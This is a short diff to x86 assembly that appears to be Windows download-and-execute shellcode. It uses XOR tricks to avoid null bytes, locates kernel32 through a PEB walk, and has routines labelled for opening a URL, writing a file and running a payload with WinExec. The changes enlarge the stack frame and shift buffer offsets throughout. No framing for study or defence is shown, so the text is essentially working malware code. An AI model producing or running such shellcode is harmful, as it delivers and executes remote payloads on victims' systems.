@@ -137,7 +137,7 @@ main:
     mov  ebp, esp
     xor  ecx, ecx
     mov  ecx, 0x01010301
-    xor  ecx, 0x01010201
+    xor  ecx, 0x01010101
     sub  esp, ecx
 
     ; Bootstrap: find kernel32 via PEB walk
@@ -308,7 +308,7 @@ wf_entry:
     mov  eax, 0x01010103
     xor  eax, 0x01010102
     push eax                      ; arg1
-    lea  eax, [ebp-0x8c]
+    lea  eax, [ebp-0x10c]
     push eax                      ; arg0
     call dword ptr [ebp-0x2c]
     mov  [ebp-0x5c], eax
@@ -329,7 +329,7 @@ wf_open_url:
     push eax                      ; arg3
     xor  eax, eax
     push eax                      ; arg2
-    lea  eax, [ebp-0xb0]
+    lea  eax, [ebp-0x130]
     push eax                      ; arg1
     mov  eax, [ebp-0x5c]
     push eax                      ; arg0
@@ -414,7 +414,7 @@ wf_write_file:
     mov  eax, 0x41010101
     xor  eax, 0x01010101
     push eax                      ; arg1
-    lea  eax, [ebp-0xbc]
+    lea  eax, [ebp-0x13c]
     push eax                      ; arg0
     call dword ptr [ebp-0x40]
     mov  [ebp-0x6c], eax
@@ -451,7 +451,7 @@ wf_exec_payload:
     ; WinExec(lpCmdLine, uCmdShow)
     xor  eax, eax
     push eax                      ; uCmdShow
-    lea  eax, [ebp-0xbc]
+    lea  eax, [ebp-0x13c]
     push eax                      ; lpCmdLine
     call dword ptr [ebp-0x4c]
     mov  [ebp-0x70], eax
